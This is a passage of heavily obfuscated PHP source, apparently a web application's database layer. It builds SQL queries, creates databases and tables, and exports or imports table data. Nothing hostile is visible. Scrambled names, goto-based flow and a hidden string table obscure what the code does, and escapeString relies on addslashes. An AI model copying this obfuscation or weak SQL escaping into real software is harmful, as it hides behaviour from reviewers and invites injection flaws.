$A¦¡Å¬â†ö[50] . $AÏŠÏ±ã´‘ . $A¦¡Å¬â†ö[50] . $this->parseValue($Fí¿©ñ µ) . $A¦¡Å¬â†ö[966] . $F¥˜÷ƒö„ã . $A¦¡Å¬â†ö[50]; } } $eù·òñø×¿ = substr($eù·òñø×¿, 0, -4); } } else { $eù·òñø×¿ .= $f”¹ƒ–²•Ñ . $A¦¡Å¬â†ö[970] . $this->parseValue($D£–ÇìËèÀ); } return $eù·òñø×¿; } protected function parseThinkWhere($F»–èò‰ç, $b‡‹×²Î÷) { $c³…£ñÏŒŠ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b‰Á•Û£ğ÷ = $c³…£ñÏŒŠ[33]; switch ($F»–èò‰ç) { case $c³…£ñÏŒŠ[350]: $b‰Á•Û£ğ÷ = $b‡‹×²Î÷; break; case $c³…£ñÏŒŠ[953]: $b‰Á•Û£ğ÷ = is_string($b‡‹×²Î÷) ? $b‡‹×²Î÷ : substr($this->parseWhere($b‡‹×²Î÷), 6); break; case $c³…£ñÏŒŠ[971]: parse_str($b‡‹×²Î÷, $f™ˆ®ÈŒŠÙ); if (isset($f™ˆ®ÈŒŠÙ[$c³…£ñÏŒŠ[948]])) { $a§†Ú§åáÏ = $c³…£ñÏŒŠ[50] . strtoupper($f™ˆ®ÈŒŠÙ[$c³…£ñÏŒŠ[948]]) . $c³…£ñÏŒŠ[50]; unset($f™ˆ®ÈŒŠÙ[$c³…£ñÏŒŠ[948]]); } else { $a§†Ú§åáÏ = $c³…£ñÏŒŠ[952]; } $eÏ‡¾ªÃÂó = array(); foreach ($f™ˆ®ÈŒŠÙ as $eóÀ£¤ÑÕ° => $a¨¸Ô¹‰õ) { $eÏ‡¾ªÃÂó[] = $this->parseKey($eóÀ£¤ÑÕ°) . $c³…£ñÏŒŠ[970] . $this->parseValue($a¨¸Ô¹‰õ); } $b‰Á•Û£ğ÷ = implode($a§†Ú§åáÏ, $eÏ‡¾ªÃÂó); break; } return $b‰Á•Û£ğ÷; } protected function parseLimit($EÙË²‡‰…‚) { $cİ¿Ççï—Ş =& $_SERVER[ÒÆ›ÆØÎ¾]; return !empty($EÙË²‡‰…‚) ? $cİ¿Ççï—Ş[48] . $EÙË²‡‰…‚ . $cİ¿Ççï—Ş[50] : $cİ¿Ççï—Ş[33]; } protected function parseJoin($CóæÎ•Ò‡÷) { $cõ²…ò‚ã“ =& $_SERVER[ÒÆ›ÆØÎ¾]; $BÜËäé‹Î¢ = $cõ²…ò‚ã“[33]; if (!empty($CóæÎ•Ò‡÷)) { if (is_array($CóæÎ•Ò‡÷)) { foreach ($CóæÎ•Ò‡÷ as $A¦­–ìŠŸ => $aÚßŒ‹ØÊÙ) { if (!1 !== stripos($aÚßŒ‹ØÊÙ, $cõ²…ò‚ã“[972])) { $BÜËäé‹Î¢ .= $cõ²…ò‚ã“[50] . $aÚßŒ‹ØÊÙ; } else { $BÜËäé‹Î¢ .= $cõ²…ò‚ã“[973] . $aÚßŒ‹ØÊÙ; } } } else { $BÜËäé‹Î¢ .= $cõ²…ò‚ã“[973] . $CóæÎ•Ò‡÷; } } $BÜËäé‹Î¢ = preg_replace($cõ²…ò‚ã“[974], think_config($cõ²…ò‚ã“[880]) . $cõ²…ò‚ã“[975], $BÜËäé‹Î¢); return $BÜËäé‹Î¢; } protected function parseOrder($Féê’êù™±) { $a©×†Œœò¡ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (is_array($Féê’êù™±)) { $aµ±Óí‰Š… = array(); foreach ($Féê’êù™± as $B¦ºî£¯  => $A…•ø£™¨Ú) { if (is_numeric($B¦ºî£¯ )) { $aµ±Óí‰Š…[] = $this->parseKey($A…•ø£™¨Ú); } else { $A…•ø£™¨Ú = in_array(strtoupper(trim($A…•ø£™¨Ú)), array($a©×†Œœò¡[976], $a©×†Œœò¡[977])) ? $a©×†Œœò¡[50] . $A…•ø£™¨Ú : $a©×†Œœò¡[33]; if (preg_match($a©×†Œœò¡[978], $B¦ºî£¯ )) { $aµ±Óí‰Š…[] = $this->parseKey($B¦ºî£¯ ) . $A…•ø£™¨Ú; } else { think_exception($a©×†Œœò¡[979] . $B¦ºî£¯ ); } } } $Féê’êù™± = implode($a©×†Œœò¡[47], $aµ±Óí‰Š…); } return !empty($Féê’êù™±) ? $a©×†Œœò¡[980] . $Féê’êù™± : $a©×†Œœò¡[33]; } protected function parseGroup($bÑÅÂÑªÂ) { $F”Á£¢äÍ =& $_SERVER[ÒÆ›ÆØÎ¾]; return !empty($bÑÅÂÑªÂ) ? $F”Á£¢äÍ[981] . $bÑÅÂÑªÂ : $F”Á£¢äÍ[33]; } protected function parseHaving($eèîÔº©ñ) { $Dã´£¹ÁŸå =& $_SERVER[ÒÆ›ÆØÎ¾]; return !empty($eèîÔº©ñ) ? $Dã´£¹ÁŸå[982] . $eèîÔº©ñ : $Dã´£¹ÁŸå[33]; } protected function parseComment($Eàòìš£—ˆ) { $DÌœ‘¼Í‡ò =& $_SERVER[ÒÆ›ÆØÎ¾]; return !empty($Eàòìš£—ˆ) ? $DÌœ‘¼Í‡ò[983] . $Eàòìš£—ˆ . $DÌœ‘¼Í‡ò[984] : $DÌœ‘¼Í‡ò[33]; } protected function parseDistinct($Bâ ©®ê¼Ø) { $BÈ¥®•ŒÙ™ =& $_SERVER[ÒÆ›ÆØÎ¾]; return !empty($Bâ ©®ê¼Ø) ? $BÈ¥®•ŒÙ™[985] : $BÈ¥®•ŒÙ™[33]; } protected function parseUnion($F¶¯à÷¾„²) { $CÚèîÂ¯™¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($F¶¯à÷¾„²)) { return $CÚèîÂ¯™¦[33]; } if (isset($F¶¯à÷¾„²[$CÚèîÂ¯™¦[346]])) { $Dã¢œ­“Ä¥ = $CÚèîÂ¯™¦[986]; unset($F¶¯à÷¾„²[$CÚèîÂ¯™¦[346]]); } else { $Dã¢œ­“Ä¥ = $CÚèîÂ¯™¦[987]; } foreach ($F¶¯à÷¾„² as $eˆğ™²Í˜) { $a¥İ‰ìß‡[] = $Dã¢œ­“Ä¥ . (is_array($eˆğ™²Í˜) ? $this->buildSelectSql($eˆğ™²Í˜) : $eˆğ™²Í˜); } return implode($CÚèîÂ¯™¦[50], $a¥İ‰ìß‡); } public function insert($C®§‘—‚İÕ, $e¹Â¬ÌäÓ = array(), $cíÃš®¼ä = false) { goto CÀ«×´¼Ó; CÀ«×´¼Ó: $d¸ÏçÁùÙ =& $_SERVER[ÒÆ›ÆØÎ¾]; $C ß”¦ÅÏ = $B²÷©¼ºí˜ = array(); $this->model = $e¹Â¬ÌäÓ[$d¸ÏçÁùÙ[279]]; goto Cóï·æ‚; F„±¯Å‘š: $DÂœ²•Ñ¦§ .= $this->parseComment(!empty($e¹Â¬ÌäÓ[$d¸ÏçÁùÙ[352]]) ? $e¹Â¬ÌäÓ[$d¸ÏçÁùÙ[352]] : $d¸ÏçÁùÙ[33]); return $this->execute($DÂœ²•Ñ¦§, $this->parseBind(!empty($e¹Â¬ÌäÓ[$d¸ÏçÁùÙ[283]]) ? $e¹Â¬ÌäÓ[$d¸ÏçÁùÙ[283]] : array())); goto E®÷¯ò­Ñè; Cóï·æ‚: foreach ($C®§‘—‚İÕ as $bë°‘ƒƒò => $fŞâ¢ßˆ) { if (is_array($fŞâ¢ßˆ) && $d¸ÏçÁùÙ[295] == $fŞâ¢ßˆ[0]) { $B²÷©¼ºí˜[] = $this->parseKey($bë°‘ƒƒò); $C ß”¦ÅÏ[] = $fŞâ¢ßˆ[1]; } elseif (is_scalar($fŞâ¢ßˆ) || is_null($fŞâ¢ßˆ)) { $B²÷©¼ºí˜[] = $this->parseKey($bë°‘ƒƒò); $C ß”¦ÅÏ[] = $this->parseValue($fŞâ¢ßˆ); } } $DÂœ²•Ñ¦§ = ($cíÃš®¼ä ? $d¸ÏçÁùÙ[858] : $d¸ÏçÁùÙ[859]) . $d¸ÏçÁùÙ[860] . $this->parseTable($e¹Â¬ÌäÓ[$d¸ÏçÁùÙ[277]]) . $d¸ÏçÁùÙ[854] . implode($d¸ÏçÁùÙ[47], $B²÷©¼ºí˜) . $d¸ÏçÁùÙ[855] . implode($d¸ÏçÁùÙ[47], $C ß”¦ÅÏ) . $d¸ÏçÁùÙ[856]; $DÂœ²•Ñ¦§ .= $this->parseLock(isset($e¹Â¬ÌäÓ[$d¸ÏçÁùÙ[811]]) ? $e¹Â¬ÌäÓ[$d¸ÏçÁùÙ[811]] : !1); goto F„±¯Å‘š; E®÷¯ò­Ñè: } public function selectInsert($CÍ¨ùâéĞ¸, $FŸŒÄ¼Œç‘, $EÅ“«Ì…ƒ„ = array()) { goto d¹²‡•; AºÈ·²ƒ¡İ: return $this->execute($a¥œÍéĞí÷, $this->parseBind(!empty($EÅ“«Ì…ƒ„[$aâø‡Îœ‚ê[283]]) ? $EÅ“«Ì…ƒ„[$aâø‡Îœ‚ê[283]] : array())); goto Dõ›Á’óñ; eöø¿áÙ²Á: array_walk($CÍ¨ùâéĞ¸, array($this, $aâø‡Îœ‚ê[857])); $a¥œÍéĞí÷ = $aâø‡Îœ‚ê[988] . $this->parseTable($FŸŒÄ¼Œç‘) . $aâø‡Îœ‚ê[854] . implode($aâø‡Îœ‚ê[47], $CÍ¨ùâéĞ¸) . $aâø‡Îœ‚ê[966]; $a¥œÍéĞí÷ .= $this->buildSelectSql($EÅ“«Ì…ƒ„); goto AºÈ·²ƒ¡İ; d¹²‡•: $aâø‡Îœ‚ê =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->model = $EÅ“«Ì…ƒ„[$aâø‡Îœ‚ê[279]]; if (is_string($CÍ¨ùâéĞ¸)) { $CÍ¨ùâéĞ¸ = explode($aâø‡Îœ‚ê[47], $CÍ¨ùâéĞ¸); } goto eöø¿áÙ²Á; Dõ›Á’óñ: } public function update($c·Şî‘öëƒ, $a²ËµØ•öï) { $bÆÍˆùŞõ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->model = $a²ËµØ•öï[$bÆÍˆùŞõ[279]]; $D­µ†•‰ÔÄ = $bÆÍˆùŞõ[989] . $this->parseTable($a²ËµØ•öï[$bÆÍˆùŞõ[277]]) . $this->parseSet($c·Şî‘öëƒ) . $this->parseWhere(!empty($a²ËµØ•öï[$bÆÍˆùŞõ[273]]) ? $a²ËµØ•öï[$bÆÍˆùŞõ[273]] : $bÆÍˆùŞõ[33]) . $this->parseOrder(!empty($a²ËµØ•öï[$bÆÍˆùŞõ[363]]) ? $a²ËµØ•öï[$bÆÍˆùŞõ[363]] : $bÆÍˆùŞõ[33]) . $this->parseLimit(!empty($a²ËµØ•öï[$bÆÍˆùŞõ[290]]) ? $a²ËµØ•öï[$bÆÍˆùŞõ[290]] : $bÆÍˆùŞõ[33]) . $this->parseLock(isset($a²ËµØ•öï[$bÆÍˆùŞõ[811]]) ? $a²ËµØ•öï[$bÆÍˆùŞõ[811]] : !1) . $this->parseComment(!empty($a²ËµØ•öï[$bÆÍˆùŞõ[352]]) ? $a²ËµØ•öï[$bÆÍˆùŞõ[352]] : $bÆÍˆùŞõ[33]); return $this->execute($D­µ†•‰ÔÄ, $this->parseBind(!empty($a²ËµØ•öï[$bÆÍˆùŞõ[283]]) ? $a²ËµØ•öï[$bÆÍˆùŞõ[283]] : array())); } public function delete($dİ‹ì¹²–¹ = array()) { $AäÃ…¥ßô  =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->model = $dİ‹ì¹²–¹[$AäÃ…¥ßô [279]]; $B›ğâÏÎ¹í = $AäÃ…¥ßô [990] . $this->parseTable($dİ‹ì¹²–¹[$AäÃ…¥ßô [277]]) . $this->parseWhere(!empty($dİ‹ì¹²–¹[$AäÃ…¥ßô [273]]) ? $dİ‹ì¹²–¹[$AäÃ…¥ßô [273]] : $AäÃ…¥ßô [33]) . $this->parseOrder(!empty($dİ‹ì¹²–¹[$AäÃ…¥ßô [363]]) ? $dİ‹ì¹²–¹[$AäÃ…¥ßô [363]] : $AäÃ…¥ßô [33]) . $this->parseLimit(!empty($dİ‹ì¹²–¹[$AäÃ…¥ßô [290]]) ? $dİ‹ì¹²–¹[$AäÃ…¥ßô [290]] : $AäÃ…¥ßô [33]) . $this->parseLock(isset($dİ‹ì¹²–¹[$AäÃ…¥ßô [811]]) ? $dİ‹ì¹²–¹[$AäÃ…¥ßô [811]] : !1) . $this->parseComment(!empty($dİ‹ì¹²–¹[$AäÃ…¥ßô [352]]) ? $dİ‹ì¹²–¹[$AäÃ…¥ßô [352]] : $AäÃ…¥ßô [33]); return $this->execute($B›ğâÏÎ¹í, $this->parseBind(!empty($dİ‹ì¹²–¹[$AäÃ…¥ßô [283]]) ? $dİ‹ì¹²–¹[$AäÃ…¥ßô [283]] : array())); } public function select($bá–Ã“ñ“ß = array()) { goto F ˆŞ‚±Ö”; F ˆŞ‚±Ö”: $bİ´äÀ›„‰ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->model = $bá–Ã“ñ“ß[$bİ´äÀ›„‰[279]]; $B‰æëÑù™£ = $this->buildSelectSql($bá–Ã“ñ“ß); goto DÊñİĞœÊã; CÑ½Ì™ó¥: if ($eÂ‚É˜æ¹³ && !1 !== $b…Šñ„¼ò©) { think_cache($DŸÏ…Øçš, $b…Šñ„¼ò©, $eÂ‚É˜æ¹³); } return $b…Šñ„¼ò©; goto fìà‚ •; DÊñİĞœÊã: $eÂ‚É˜æ¹³ = isset($bá–Ã“ñ“ß[$bİ´äÀ›„‰[347]]) ? $bá–Ã“ñ“ß[$bİ´äÀ›„‰[347]] : !1; if ($eÂ‚É˜æ¹³) { $DŸÏ…Øçš = is_string($eÂ‚É˜æ¹³[$bİ´äÀ›„‰[93]]) ? $eÂ‚É˜æ¹³[$bİ´äÀ›„‰[93]] : $bİ´äÀ›„‰[991] . md5($B‰æëÑù™£); $Bò…Ï¨º““ = think_cache($DŸÏ…Øçš, $bİ´äÀ›„‰[33], $eÂ‚É˜æ¹³); if (!1 !== $Bò…Ï¨º““) { return $Bò…Ï¨º““; } } $b…Šñ„¼ò© = $this->query($B‰æëÑù™£, $this->parseBind(!empty($bá–Ã“ñ“ß[$bİ´äÀ›„‰[283]]) ? $bá–Ã“ñ“ß[$bİ´äÀ›„‰[283]] : array())); goto CÑ½Ì™ó¥; fìà‚ •: } public function buildSelectSql($aùÅğŒ‚š = array()) { goto AÁ’•¹œ×è; c·ìÁÁŒùâ: $BåÌñêç÷ = $this->parseSql($this->selectSql, $aùÅğŒ‚š); $BåÌñêç÷ .= $this->parseLock(isset($aùÅğŒ‚š[$A¦°–Ìò‰Ä[811]]) ? $aùÅğŒ‚š[$A¦°–Ìò‰Ä[811]] : !1); if (isset($BÏ•Î É¤ç)) { think_cache($BÏ•Î É¤ç, $BåÌñêç÷); } goto F¥öî»âŸœ; F¥öî»âŸœ: return $BåÌñêç÷; goto eÃó‘ŠÃ; AÁ’•¹œ×è: $A¦°–Ìò‰Ä =& $_SERVER[ÒÆ›ÆØÎ¾]; if (isset($aùÅğŒ‚š[$A¦°–Ìò‰Ä[351]])) { if (strpos($aùÅğŒ‚š[$A¦°–Ìò‰Ä[351]], $A¦°–Ìò‰Ä[47])) { list($dÆ×À…ğíİ, $b‡µêÔÅö) = explode($A¦°–Ìò‰Ä[47], $aùÅğŒ‚š[$A¦°–Ìò‰Ä[351]]); } else { $dÆ×À…ğíİ = $aùÅğŒ‚š[$A¦°–Ìò‰Ä[351]]; } $dÆ×À…ğíİ = $dÆ×À…ğíİ ? $dÆ×À…ğíİ : 1; $b‡µêÔÅö = isset($b‡µêÔÅö) ? $b‡µêÔÅö : (is_numeric($aùÅğŒ‚š[$A¦°–Ìò‰Ä[290]]) ? $aùÅğŒ‚š[$A¦°–Ìò‰Ä[290]] : 20); $D½Ÿ„…‰Û = $b‡µêÔÅö * ((int) $dÆ×À…ğíİ - 1); $aùÅğŒ‚š[$A¦°–Ìò‰Ä[290]] = $D½Ÿ„…‰Û . $A¦°–Ìò‰Ä[47] . $b‡µêÔÅö; } if (think_config($A¦°–Ìò‰Ä[992])) { $BÏ•Î É¤ç = $A¦°–Ìò‰Ä[993] . md5(serialize($aùÅğŒ‚š)); $cµÚÕÙÕí– = think_cache($BÏ•Î É¤ç); if ($cµÚÕÙÕí–) { return $cµÚÕÙÕí–; } } goto c·ìÁÁŒùâ; eÃó‘ŠÃ: } public function parseSql($bŞîÇ®ÀŞ°, $f¯ìËšÍ = array()) { $Fö¹åÌË‚ù =& $_SERVER[ÒÆ›ÆØÎ¾]; $bŞîÇ®ÀŞ° = str_replace(array($Fö¹åÌË‚ù[994], $Fö¹åÌË‚ù[995], $Fö¹åÌË‚ù[996], $Fö¹åÌË‚ù[997], $Fö¹åÌË‚ù[998], $Fö¹åÌË‚ù[999], $Fö¹åÌË‚ù[1000], $Fö¹åÌË‚ù[1001], $Fö¹åÌË‚ù[1002], $Fö¹åÌË‚ù[1003], $Fö¹åÌË‚ù[1004]), array($this->parseTable("{$f¯ìËšÍ[$Fö¹åÌË‚ù[277]]}"), $this->parseDistinct(isset($f¯ìËšÍ[$Fö¹åÌË‚ù[1005]]) ? $f¯ìËšÍ[$Fö¹åÌË‚ù[1005]] : !1), $this->parseField(!empty($f¯ìËšÍ[$Fö¹åÌË‚ù[271]]) ? $f¯ìËšÍ[$Fö¹åÌË‚ù[271]] : $Fö¹åÌË‚ù[182]), $this->parseJoin(!empty($f¯ìËšÍ[$Fö¹åÌË‚ù[280]]) ? $f¯ìËšÍ[$Fö¹åÌË‚ù[280]] : $Fö¹åÌË‚ù[33]), $this->parseWhere(!empty($f¯ìËšÍ[$Fö¹åÌË‚ù[273]]) ? $f¯ìËšÍ[$Fö¹åÌË‚ù[273]] : $Fö¹åÌË‚ù[33]), $this->parseGroup(!empty($f¯ìËšÍ[$Fö¹åÌË‚ù[1006]]) ? $f¯ìËšÍ[$Fö¹åÌË‚ù[1006]] : $Fö¹åÌË‚ù[33]), $this->parseHaving(!empty($f¯ìËšÍ[$Fö¹åÌË‚ù[1007]]) ? $f¯ìËšÍ[$Fö¹åÌË‚ù[1007]] : $Fö¹åÌË‚ù[33]), $this->parseOrder(!empty($f¯ìËšÍ[$Fö¹åÌË‚ù[363]]) ? $f¯ìËšÍ[$Fö¹åÌË‚ù[363]] : $Fö¹åÌË‚ù[33]), $this->parseLimit(!empty($f¯ìËšÍ[$Fö¹åÌË‚ù[290]]) ? $f¯ìËšÍ[$Fö¹åÌË‚ù[290]] : $Fö¹åÌË‚ù[33]), $this->parseUnion(!empty($f¯ìËšÍ[$Fö¹åÌË‚ù[345]]) ? $f¯ìËšÍ[$Fö¹åÌË‚ù[345]] : $Fö¹åÌË‚ù[33]), $this->parseComment(!empty($f¯ìËšÍ[$Fö¹åÌË‚ù[352]]) ? $f¯ìËšÍ[$Fö¹åÌË‚ù[352]] : $Fö¹åÌË‚ù[33])), $bŞîÇ®ÀŞ°); return $bŞîÇ®ÀŞ°; } public function getLastSql($D‡Õ¹ˆ±É• = '') { return $D‡Õ¹ˆ±É• ? $this->modelSql[$D‡Õ¹ˆ±É•] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($fÏ‹†˜™å¬) { return addslashes($fÏ‹†˜™å¬); } public function setModel($BŸ§è‡ÄÎ‹) { $this->model = $BŸ§è‡ÄÎ‹; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($d§çœéÍ÷, $B‡Ö©—£ˆ = '') { $this->database = $d§çœéÍ÷; $this->type = $B‡Ö©—£ˆ; } public function model($d†î‚ÁŒ´ = '') { return new ModelBase($d†î‚ÁŒ´, $_SERVER[ÒÆ›ÆØÎ¾][33], $this->database); } public function db($DÒï’òç± = false) { goto EÂ‘Î°‡Ô×; C÷ƒàÒº‚: $däØè„É‡ó = $A ¼¹æè‚‚[$cÈá‚ØÈ¸›[920]]; $A ¼¹æè‚‚[$cÈá‚ØÈ¸›[920]] = $cÈá‚ØÈ¸›[33]; if ($A ¼¹æè‚‚[$cÈá‚ØÈ¸›[746]] == $cÈá‚ØÈ¸›[747]) { $fí£Îù©ÑÆ = $A ¼¹æè‚‚[$cÈá‚ØÈ¸›[748]]; $A ¼¹æè‚‚[$cÈá‚ØÈ¸›[748]] = substr($fí£Îù©ÑÆ, 0, strrpos($fí£Îù©ÑÆ, $cÈá‚ØÈ¸›[1008])); } goto eƒ‘İ­Ñ®¥; EÂ‘Î°‡Ô×: $cÈá‚ØÈ¸› =& $_SERVER[ÒÆ›ÆØÎ¾]; $A ¼¹æè‚‚ = array_change_key_case($this->database); if ($this->type == $cÈá‚ØÈ¸›[9] || !$DÒï’òç±) { return $this->model()->db(); } goto C÷ƒàÒº‚; eƒ‘İ­Ñ®¥: $this->database = $A ¼¹æè‚‚; $FÈ„‡Ÿ¿² = $this->model()->db(); try { $F•›ó¡ÅÛ = $FÈ„‡Ÿ¿²->execute("\x73\150\x6f\167\x20\144\x61\x74\x61\142\141\163\x65\163\40\154\x69\153\145\x20\47{$däØè„É‡ó}\47"); } catch (Exception $c ™¼Œá) { } goto fõŒîÒ¨•; CíÏ¦¿„½Ê: $this->database = $A ¼¹æè‚‚; $FÈ„‡Ÿ¿²->execute("\x75\x73\145\x20\140{$däØè„É‡ó}\140"); return $FÈ„‡Ÿ¿²; goto B“Êí®òÎ¯; fõŒîÒ¨•: if (!$F•›ó¡ÅÛ) { $FÈ„‡Ÿ¿²->execute("\x63\162\x65\141\164\145\40\x64\x61\164\141\142\x61\163\x65\40\140{$däØè„É‡ó}\140"); } $A ¼¹æè‚‚[$cÈá‚ØÈ¸›[920]] = $däØè„É‡ó; if ($A ¼¹æè‚‚[$cÈá‚ØÈ¸›[746]] == $cÈá‚ØÈ¸›[747]) { $A ¼¹æè‚‚[$cÈá‚ØÈ¸›[748]] .= $cÈá‚ØÈ¸›[1008] . $däØè„É‡ó; } goto CíÏ¦¿„½Ê; B“Êí®òÎ¯: } public function createTable($Dİ£­¤¥‘æ, $c²óÂ‘õä¼ = null) { $eÑ„¾á… Á =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!IO::exist($Dİ£­¤¥‘æ)) { ActionCall($eÑ„¾á… Á[1009], !0, 0); show_json(LNG($eÑ„¾á… Á[1010]), !1); } $F¶ÚğŒñ¥ô = sqlSplit(IO::getContent($Dİ£­¤¥‘æ)); foreach ($F¶ÚğŒñ¥ô as $e‹×Ïó·˜œ) { if ($c²óÂ‘õä¼) { $BµÌİêòø = stripos($e‹×Ïó·˜œ, $eÑ„¾á… Á[1011]) === 0; if ($BµÌİêòø) { $c²óÂ‘õä¼->task[$eÑ„¾á… Á[1012]] += 1; } } $this->model()->db()->execute($e‹×Ïó·˜œ); if ($c²óÂ‘õä¼ && $BµÌİêòø) { preg_match($eÑ„¾á… Á[1013], $e‹×Ïó·˜œ, $C¸Ó¦¸•ƒ´); $c²óÂ‘õä¼->task[$eÑ„¾á… Á[1014]] = $C¸Ó¦¸•ƒ´[1]; $c²óÂ‘õä¼->update(1); } } $this->taskToCache($c²óÂ‘õä¼); } public function insertTable($A†•Œ¨İ‚Ç, $b¥Æ¹¤ = null) { $b ˜Åõá¬½ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eºƒˆù´ï = $this->model()->db(); $c“¬ˆäÛ¡İ = $A±õÎ£óéƒ ? array($A±õÎ£óéƒ) : $eºƒˆù´ï->getTables(); foreach ($A†•Œ¨İ‚Ç as $c—Îœîàä) { $A±õÎ£óéƒ = basename($c—Îœîàä, $b ˜Åõá¬½[738]); if (!in_array($A±õÎ£óéƒ, $c“¬ˆäÛ¡İ)) { continue; } if ($b¥Æ¹¤) { $b¥Æ¹¤->task[$b ˜Åõá¬½[1014]] = $A±õÎ£óéƒ; } if (get_filesize($c—Îœîàä) == 0) { continue; } $AˆÉ¼ËÏñ÷ = $this->sqlToDb($c—Îœîàä, $b¥Æ¹¤); if (!$AˆÉ¼ËÏñ÷) { ActionCall($b ˜Åõá¬½[1009], !0, 0); show_json(LNG($b ˜Åõá¬½[1015]) . "\x5b{$A±õÎ£óéƒ}\135", !1); } } $this->taskToCache($b¥Æ¹¤); } public function sqlFromDb($b¥¼ƒÒÃÑÙ, $c’÷›Îò½¢, $FÉ–Õê¤šĞ = null, $aèŸ¯´çôŠ = null) { goto CÎ¥©«×ÄÕ; CÎ¥©«×ÄÕ: if ($FÉ–Õê¤šĞ) { $FÉ–Õê¤šĞ->task[$_SERVER[ÒÆ›ÆØÎ¾][1014]] = $b¥¼ƒÒÃÑÙ; } $aŒæ¹š‰ëƒ = $this->model($b¥¼ƒÒÃÑÙ); $C÷‹¹Ş‹¸‹ = 0; goto C·Óó‚İÃÇ; fĞê÷™­ö: $fï­àÔ­‰µ = $aŒæ¹š‰ëƒ->getPk(); $f’—À…ô®ˆ = $aŒæ¹š‰ëƒ->getDbFields(); do { $eÎ½›Ï¥« = array($fï­àÔ­‰µ => array($_SERVER[ÒÆ›ÆØÎ¾][962], $D‡Ğøƒ¥ĞÒ)); $B‘óØÄßÕ‰ = $aŒæ¹š‰ëƒ->where($eÎ½›Ï¥«)->field($f’—À…ô®ˆ)->order($fï­àÔ­‰µ . $_SERVER[ÒÆ›ÆØÎ¾][1017])->limit($d¾§¿ãê–‰)->select(); $B‘óØÄßÕ‰ = !empty($B‘óØÄßÕ‰) ? $B‘óØÄßÕ‰ : array(); if (!($c‘ñ¬Ûßó§ = count($B‘óØÄßÕ‰))) { break; } $C«§ªÀô = end($B‘óØÄßÕ‰); $D‡Ğøƒ¥ĞÒ = $C«§ªÀô[$fï­àÔ­‰µ]; $FğÛ¾ê­£ = array(); foreach ($B‘óØÄßÕ‰ as $F­ÈË‰•Ú£) { if ($b¥¼ƒÒÃÑÙ == $_SERVER[ÒÆ›ÆØÎ¾][1018] && $F­ÈË‰•Ú£[$_SERVER[ÒÆ›ÆØÎ¾][29]] == $_SERVER[ÒÆ›ÆØÎ¾][1019]) { $FÚÍóƒ´§ê = json_decode($F­ÈË‰•Ú£[$_SERVER[ÒÆ›ÆØÎ¾][372]], !0); if ($FÚÍóƒ´§ê[$_SERVER[ÒÆ›ÆØÎ¾][28]] == date($_SERVER[ÒÆ›ÆØÎ¾][703]) && !$FÚÍóƒ´§ê[$_SERVER[ÒÆ›ÆØÎ¾][702]]) { continue; } } if ($aèŸ¯´çôŠ) { $F­ÈË‰•Ú£[$_SERVER[ÒÆ›ÆØÎ¾][76]] = "\x7b\151\157\72{$aèŸ¯´çôŠ}\x7d" . substr($F­ÈË‰•Ú£[$_SERVER[ÒÆ›ÆØÎ¾][76]], strlen("\x7b\x69\157\x3a{$F­ÈË‰•Ú£[$_SERVER[ÒÆ›ÆØÎ¾][774]]}\x7d")); $F­ÈË‰•Ú£[$_SERVER[ÒÆ›ÆØÎ¾][774]] = $aèŸ¯´çôŠ; } $FğÛ¾ê­£[] = $_SERVER[ÒÆ›ÆØÎ¾][1020] . $this->sqlEncode($F­ÈË‰•Ú£) . $_SERVER[ÒÆ›ÆØÎ¾][1021]; } $a÷Ÿ¦ÛñŞ = "\111\x4e\123\105\122\124\x20\111\x4e\124\117\40\140{$b¥¼ƒÒÃÑÙ}\x60\40\x28\140" . implode($_SERVER[ÒÆ›ÆØÎ¾][1022], $f’—À…ô®ˆ) . $_SERVER[ÒÆ›ÆØÎ¾][1023]; fwrite($EÇìŸÁ…è¢, $a÷Ÿ¦ÛñŞ . implode($_SERVER[ÒÆ›ÆØÎ¾][1024], $FğÛ¾ê­£) . $_SERVER[ÒÆ›ÆØÎ¾][68] . PHP_EOL); $C÷‹¹Ş‹¸‹ += $c‘ñ¬Ûßó§; if ($FÉ–Õê¤šĞ) { $FÉ–Õê¤šĞ->update($c‘ñ¬Ûßó§); } } while ($d¾§¿ãê–‰ == $c‘ñ¬Ûßó§); goto B•Ñº§õ¤; B•Ñº§õ¤: fclose($EÇìŸÁ…è¢); return $C÷‹¹Ş‹¸‹; goto f¿âìÃ±¾; C·Óó‚İÃÇ: $D‡Ğøƒ¥ĞÒ = 0; $d¾§¿ãê–‰ = 10000; $EÇìŸÁ…è¢ = fopen($c’÷›Îò½¢, $_SERVER[ÒÆ›ÆØÎ¾][1016]); goto fĞê÷™­ö; f¿âìÃ±¾: } public function sqlToDb($EÆßèåÚàò, $E‚ÔŒ³‹ÖŠ = null) { goto fæŠñ«ë„; FØÓ¡¡Û­¥: $Fª¼×Í®‰ = array(); $e¹‹æ™’¾œ = $this->type == $aØ¸‰ô”××[9] ? 500 : 2000; $EÆ÷¶†º‹¾ = basename($EÆßèåÚàò, $aØ¸‰ô”××[738]); goto A‚±‚èÖä‡; c§ÆØîù·¿: if (!empty($Fª¼×Í®‰)) { $cÈ‰„Ş‰á¿ = $A®ƒì®êÆì . implode($aØ¸‰ô”××[47], $Fª¼×Í®‰); if (!$BİˆÅ¬¾->execute($cÈ‰„Ş‰á¿)) { return !1; } if ($E‚ÔŒ³‹ÖŠ) { $E‚ÔŒ³‹ÖŠ->update($Bóß§§à®); } } return !0; goto EäšÖÀŒ ; F˜£—±ñ: if (!$Cí±‚¡‚®) { return !1; } $Bóß§§à® = 0; $A®ƒì®êÆì = $aØ¸‰ô”××[33]; goto FØÓ¡¡Û­¥; fæŠñ«ë„: $aØ¸‰ô”×× =& $_SERVER[ÒÆ›ÆØÎ¾]; $BİˆÅ¬¾ = $this->model()->db(); $Cí±‚¡‚® = @fopen($EÆßèåÚàò, $aØ¸‰ô”××[1025]); goto F˜£—±ñ; A‚±‚èÖä‡: if ($EÆ÷¶†º‹¾ == $aØ¸‰ô”××[1026]) { $e¹‹æ™’¾œ = 50; } 